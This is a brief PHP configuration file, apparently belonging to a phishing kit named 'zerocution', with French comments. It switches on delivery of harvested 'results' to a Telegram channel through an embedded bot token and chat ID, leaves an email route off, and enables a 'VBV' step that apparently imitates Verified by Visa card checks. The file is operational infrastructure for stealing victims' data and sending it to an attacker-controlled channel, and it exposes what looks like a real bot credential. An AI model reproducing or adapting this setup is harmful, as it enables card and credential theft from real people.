<?php

#zerocution

# Mail
$mail_send = False;                                           # False pour ne pas recevoir par Mail
$rezmail = "email@email.com";

#Telegram
$tlg_send = true;                                       # False pour ne pas recevoir par Telegram
$bot_token = "7915597361:AAEL0qP3o5lERMliSGejseHN2H8W_4D0SnM";

$rez_chat = "-1002475696720";                                 # Channel de réception des informations

# VBV

$vbv = true;
$timeVBV = "15";

# DEV

$test_mode = false;

?>